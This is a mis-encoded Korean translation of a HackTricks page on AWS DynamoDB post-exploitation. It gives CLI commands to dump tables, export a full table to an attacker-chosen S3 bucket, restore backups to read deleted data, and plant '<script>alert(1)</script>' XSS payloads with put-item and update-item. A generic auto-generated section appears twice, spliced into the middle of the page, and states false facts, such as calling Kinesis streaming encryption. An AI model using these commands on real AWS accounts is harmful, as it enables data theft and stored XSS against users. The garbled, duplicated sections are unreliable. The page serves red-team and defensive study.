# AWS - DynamoDB Post Exploitation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## DynamoDB

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ê¸°ë³¸ í‚¤ë¡œ í…Œì´ë¸”ì—ì„œ í•­ëª©ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤** (í…Œì´ë¸”ì˜ ëª¨ë“  ë°ì´í„°ë¥¼ ìš”ì²­í•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤). ë”°ë¼ì„œ ê¸°ë³¸ í‚¤ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤ (í…Œì´ë¸” ë©”íƒ€ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`describe-table`).

{% tabs %}
{% tab title="json íŒŒì¼" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}

**ì ì¬ì  ì˜í–¥:** í…Œì´ë¸”ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹

### `dynamodb:GetItem`

**ì´ì „ ê¶Œí•œê³¼ ìœ ì‚¬í•œ** ì´ ê¶Œí•œì€ ì ì¬ì  ê³µê²©ìê°€ ê²€ìƒ‰í•  í•­ëª©ì˜ ê¸°ë³¸ í‚¤ë¥¼ ì œê³µí•˜ë©´ í…Œì´ë¸”ì—ì„œ ê°’ì„ ì½ì„ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ë©´ **`transact-get-items`** ë©”ì„œë“œë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì˜ˆì‹œ:

```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```

**ì ì¬ì  ì˜í–¥:** í…Œì´ë¸”ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹

### `dynamodb:Query`

**ì´ì „ ê¶Œí•œê³¼ ìœ ì‚¬**í•˜ê²Œ ì´ ê¶Œí•œì€ ì ì¬ì  ê³µê²©ìê°€ ê²€ìƒ‰í•  í•­ëª©ì˜ ê¸°ë³¸ í‚¤ë¥¼ ì œê³µí•˜ë©´ 1ê°œì˜ í…Œì´ë¸”ì—ì„œ ê°’ì„ ì½ì„ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. [ë¹„êµì˜ í•˜ìœ„ ì§‘í•©](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ, ê¸°ë³¸ í‚¤ì™€ í—ˆìš©ë˜ëŠ” ìœ ì¼í•œ ë¹„êµëŠ” "EQ"ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ìš”ì²­ì—ì„œ ì „ì²´ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ê°€ì ¸ì˜¤ê¸° ìœ„í•´ ë¹„êµë¥¼ ì‚¬ìš©í•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤.

{% tabs %}
{% tab title="json íŒŒì¼" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**ì ì¬ì  ì˜í–¥:** í…Œì´ë¸”ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹

### `dynamodb:Scan`

ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ì—¬ **ì „ì²´ í…Œì´ë¸”ì„ ì‰½ê²Œ ë¤í”„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```

**ì ì¬ì  ì˜í–¥:** í…Œì´ë¸”ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `dynamodb:PartiQLSelect`

ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ì—¬ **ì „ì²´ í…Œì´ë¸”ì„ ì‰½ê²Œ ë¤í”„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```

ì´ ê¶Œí•œì€ `batch-execute-statement`ë¥¼ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```

í•˜ì§€ë§Œ ê°’ê³¼ í•¨ê»˜ ê¸°ë³¸ í‚¤ë¥¼ ì§€ì •í•´ì•¼ í•˜ë¯€ë¡œ ê·¸ë ‡ê²Œ ìœ ìš©í•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤.

**ì ì¬ì  ì˜í–¥:** í…Œì´ë¸”ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

ì´ ê¶Œí•œì€ ê³µê²©ìê°€ ìì‹ ì´ ì„ íƒí•œ S3 ë²„í‚·ìœ¼ë¡œ ì „ì²´ í…Œì´ë¸”ì„ **ë‚´ë³´ë‚¼ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤**:

```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```

ë‹¤ìŒ ì‘ì—…ì„ ìˆ˜í–‰í•˜ë ¤ë©´ í…Œì´ë¸”ì— ì‹œì  ë³µêµ¬ ê¸°ëŠ¥ì´ í™œì„±í™”ë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. í…Œì´ë¸”ì´ ì‹œì  ë³µêµ¬ ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‹¤í–‰í•˜ì„¸ìš”:

```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```

í™œì„±í™”ë˜ì–´ ìˆì§€ ì•Šì€ ê²½ìš°, **í™œì„±í™”**í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ì„œëŠ” **`dynamodb:ExportTableToPointInTime`** ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤:

```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```

**ì ì¬ì  ì˜í–¥:** í…Œì´ë¸”ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

ì´ëŸ¬í•œ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ë°±ì—…ì—ì„œ ìƒˆë¡œìš´ í…Œì´ë¸”ì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë˜ëŠ” ë°±ì—…ì„ ìƒì„±í•œ ë‹¤ìŒ ë‹¤ë¥¸ í…Œì´ë¸”ì— ë³µì›í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤). ê·¸ëŸ° ë‹¤ìŒ í•„ìš”í•œ ê¶Œí•œìœ¼ë¡œ ë°±ì—…ì—ì„œ **ì •ë³´ë¥¼ í™•ì¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ëŠ” **ë” ì´ìƒ í”„ë¡œë•ì…˜ í…Œì´ë¸”ì— ì—†ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**.

```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```

**ì ì¬ì  ì˜í–¥:** í…Œì´ë¸” ë°±ì—…ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹

### `dynamodb:PutItem`

ì´ ê¶Œí•œì€ ì‚¬ìš©ìê°€ í…Œì´ë¸”ì— ìƒˆë¡œìš´ í•­ëª©ì„ ì¶”ê°€í•˜ê±°ë‚˜ ê¸°ì¡´ í•­ëª©ì„ ìƒˆë¡œìš´ í•­ëª©ìœ¼ë¡œ ëŒ€ì²´í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ë™ì¼í•œ ê¸°ë³¸ í‚¤ë¥¼ ê°€ì§„ í•­ëª©ì´ ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ê²½ìš°, ì „ì²´ í•­ëª©ì´ ìƒˆë¡œìš´ í•­ëª©ìœ¼ë¡œ ëŒ€ì²´ë©ë‹ˆë‹¤. ê¸°ë³¸ í‚¤ê°€ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš°, ì§€ì •ëœ ê¸°ë³¸ í‚¤ë¥¼ ê°€ì§„ ìƒˆë¡œìš´ í•­ëª©ì´ ìƒì„±ë©ë‹ˆë‹¤.

{% tabs %}
{% tab title="XSS ì˜ˆì œ" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Korean" %}
## AWS DynamoDB í›„ë°˜ ê³µê²©

### DynamoDB í…Œì´ë¸” ìŠ¤ìº”

DynamoDB í…Œì´ë¸”ì„ ìŠ¤ìº”í•˜ì—¬ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `Scan` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ ëª¨ë“  í•­ëª©ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `FilterExpression`ì„ ì‚¬ìš©í•˜ì—¬ ê²°ê³¼ë¥¼ í•„í„°ë§í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb scan --table-name <table-name>
```

### DynamoDB í…Œì´ë¸” ì¿¼ë¦¬

DynamoDB í…Œì´ë¸”ì„ ì¿¼ë¦¬í•˜ì—¬ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `Query` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì—ì„œ íŠ¹ì • í•­ëª©ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `KeyConditionExpression`ì„ ì‚¬ìš©í•˜ì—¬ ê²°ê³¼ë¥¼ í•„í„°ë§í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb query --table-name <table-name> --key-condition-expression <condition-expression>
```

### DynamoDB í…Œì´ë¸” ìˆ˜ì •

DynamoDB í…Œì´ë¸”ì„ ìˆ˜ì •í•˜ì—¬ ë°ì´í„°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `UpdateItem` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ í•­ëª©ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `UpdateExpression`ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜ì •í•  ì†ì„±ì„ ì§€ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb update-item --table-name <table-name> --key <key> --update-expression <update-expression>
```

### DynamoDB í…Œì´ë¸” ì‚­ì œ

DynamoDB í…Œì´ë¸”ì„ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `DeleteTable` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì„ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb delete-table --table-name <table-name>
```

### DynamoDB í…Œì´ë¸” ìƒì„±

DynamoDB í…Œì´ë¸”ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CreateTable` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `AttributeDefinitions` ë° `KeySchema`ë¥¼ ì§€ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb create-table --table-name <table-name> --attribute-definitions <attribute-definitions> --key-schema <key-schema>
```

### DynamoDB í…Œì´ë¸” ë°±ì—…

DynamoDB í…Œì´ë¸”ì„ ë°±ì—…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CreateBackup` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ ë°±ì—…ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb create-backup --table-name <table-name> --backup-name <backup-name>
```

### DynamoDB í…Œì´ë¸” ë³µì›

DynamoDB í…Œì´ë¸”ì„ ë³µì›í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `RestoreTableFromBackup` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ ë°±ì—…ì—ì„œ í…Œì´ë¸”ì„ ë³µì›í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb restore-table-from-backup --target-table-name <table-name> --backup-arn <backup-arn>
```

### DynamoDB í…Œì´ë¸” ì•”í˜¸í™”

DynamoDB í…Œì´ë¸”ì„ ì•”í˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `EnableKinesisStreamingDestination` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì„ ì•”í˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb enable-kinesis-streaming-destination --table-name <table-name> --stream-arn <stream-arn>
```

### DynamoDB í…Œì´ë¸” ê¶Œí•œ ë¶€ì—¬

DynamoDB í…Œì´ë¸”ì— ëŒ€í•œ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `PutItem` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì— í•­ëª©ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `ConditionExpression`ì„ ì‚¬ìš©í•˜ì—¬ ì¡°ê±´ì„ ì§€ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb put-item --table-name <table-name> --item <item> --condition-expression <condition-expression>
```

### DynamoDB í…Œì´ë¸” ì•¡ì„¸ìŠ¤ ì œì–´

DynamoDB í…Œì´ë¸”ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CreateRole` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ ì—­í• ì„ ìƒì„±í•˜ê³ , `AttachRolePolicy` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ ì •ì±…ì„ ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws iam create-role --role-name <role-name> --assume-role-policy-document <policy-document>
aws iam attach-role-policy --role-name <role-name> --policy-arn <policy-arn>
```

### DynamoDB í…Œì´ë¸” ëª¨ë‹ˆí„°ë§

DynamoDB í…Œì´ë¸”ì„ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CloudWatch`ë¥¼ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ ì§€í‘œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws cloudwatch get-metric-statistics --namespace AWS/DynamoDB --metric-name <metric-name> --start-time <start-time> --end-time <end-time> --period <period> --statistics <statistics> --dimensions Name=TableName,Value=<table-name>
```
{% endtab %}
{% endtabs %}

```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```

**ì ì¬ì ì¸ ì˜í–¥:** DynamoDB í…Œì´ë¸”ì— ë°ì´í„°ë¥¼ ì¶”ê°€/ìˆ˜ì •í•˜ì—¬ ì¶”ê°€ì ì¸ ì·¨ì•½ì /ìš°íšŒ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŒ

### `dynamodb:UpdateItem`

ì´ ê¶Œí•œì€ ì‚¬ìš©ìê°€ í•­ëª©ì˜ ê¸°ì¡´ ì†ì„±ì„ ìˆ˜ì •í•˜ê±°ë‚˜ í•­ëª©ì— ìƒˆë¡œìš´ ì†ì„±ì„ ì¶”ê°€í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì „ì²´ í•­ëª©ì„ ëŒ€ì²´í•˜ì§€ëŠ” ì•Šìœ¼ë©°, ì§€ì •ëœ ì†ì„±ë§Œ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤. í…Œì´ë¸”ì— ê¸°ë³¸ í‚¤ê°€ ì—†ëŠ” ê²½ìš°, ì‘ì—…ì€ ì§€ì •ëœ ê¸°ë³¸ í‚¤ë¡œ ìƒˆ í•­ëª©ì„ ìƒì„±í•˜ê³  ì—…ë°ì´íŠ¸ ì‹ì—ì„œ ì§€ì •ëœ ì†ì„±ì„ ì„¤ì •í•©ë‹ˆë‹¤.

```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```

## AWS DynamoDB í›„ë°˜ ê³µê²©

### DynamoDB í…Œì´ë¸” ìŠ¤ìº”

DynamoDB í…Œì´ë¸”ì„ ìŠ¤ìº”í•˜ì—¬ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `Scan` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ ëª¨ë“  í•­ëª©ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `FilterExpression`ì„ ì‚¬ìš©í•˜ì—¬ ê²°ê³¼ë¥¼ í•„í„°ë§í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb scan --table-name <table-name>
```

### DynamoDB í…Œì´ë¸” ì¿¼ë¦¬

DynamoDB í…Œì´ë¸”ì„ ì¿¼ë¦¬í•˜ì—¬ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `Query` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì—ì„œ íŠ¹ì • í•­ëª©ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `KeyConditionExpression`ì„ ì‚¬ìš©í•˜ì—¬ ê²°ê³¼ë¥¼ í•„í„°ë§í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb query --table-name <table-name> --key-condition-expression <condition-expression>
```

### DynamoDB í…Œì´ë¸” ìˆ˜ì •

DynamoDB í…Œì´ë¸”ì„ ìˆ˜ì •í•˜ì—¬ ë°ì´í„°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `UpdateItem` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ í•­ëª©ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `UpdateExpression`ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜ì •í•  ì†ì„±ì„ ì§€ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb update-item --table-name <table-name> --key <key> --update-expression <update-expression>
```

### DynamoDB í…Œì´ë¸” ì‚­ì œ

DynamoDB í…Œì´ë¸”ì„ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `DeleteTable` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì„ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb delete-table --table-name <table-name>
```

### DynamoDB í…Œì´ë¸” ìƒì„±

DynamoDB í…Œì´ë¸”ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CreateTable` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `AttributeDefinitions` ë° `KeySchema`ë¥¼ ì§€ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb create-table --table-name <table-name> --attribute-definitions <attribute-definitions> --key-schema <key-schema>
```

### DynamoDB í…Œì´ë¸” ë°±ì—…

DynamoDB í…Œì´ë¸”ì„ ë°±ì—…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CreateBackup` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ ë°±ì—…ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb create-backup --table-name <table-name> --backup-name <backup-name>
```

### DynamoDB í…Œì´ë¸” ë³µì›

DynamoDB í…Œì´ë¸”ì„ ë³µì›í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `RestoreTableFromBackup` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ ë°±ì—…ì—ì„œ í…Œì´ë¸”ì„ ë³µì›í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb restore-table-from-backup --target-table-name <table-name> --backup-arn <backup-arn>
```

### DynamoDB í…Œì´ë¸” ì•”í˜¸í™”

DynamoDB í…Œì´ë¸”ì„ ì•”í˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `EnableKinesisStreamingDestination` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì„ ì•”í˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb enable-kinesis-streaming-destination --table-name <table-name> --stream-arn <stream-arn>
```

### DynamoDB í…Œì´ë¸” ê¶Œí•œ ë¶€ì—¬

DynamoDB í…Œì´ë¸”ì— ëŒ€í•œ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `PutItem` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì— í•­ëª©ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•„ìš”í•œ ê²½ìš° `ConditionExpression`ì„ ì‚¬ìš©í•˜ì—¬ ì¡°ê±´ì„ ì§€ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws dynamodb put-item --table-name <table-name> --item <item> --condition-expression <condition-expression>
```

### DynamoDB í…Œì´ë¸” ì•¡ì„¸ìŠ¤ ì œì–´

DynamoDB í…Œì´ë¸”ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CreateRole` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ ì—­í• ì„ ìƒì„±í•˜ê³ , `AttachRolePolicy` ì‘ì—…ì„ ì‚¬ìš©í•˜ì—¬ ì •ì±…ì„ ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws iam create-role --role-name <role-name> --assume-role-policy-document <policy-document>
aws iam attach-role-policy --role-name <role-name> --policy-arn <policy-arn>
```

### DynamoDB í…Œì´ë¸” ëª¨ë‹ˆí„°ë§

DynamoDB í…Œì´ë¸”ì„ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `CloudWatch`ë¥¼ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì˜ ì§€í‘œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
aws cloudwatch get-metric-statistics --namespace AWS/DynamoDB --metric-name <metric-name> --start-time <start-time> --end-time <end-time> --period <period> --statistics <statistics> --dimensions Name=TableName,Value=<table-name>
```

```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```

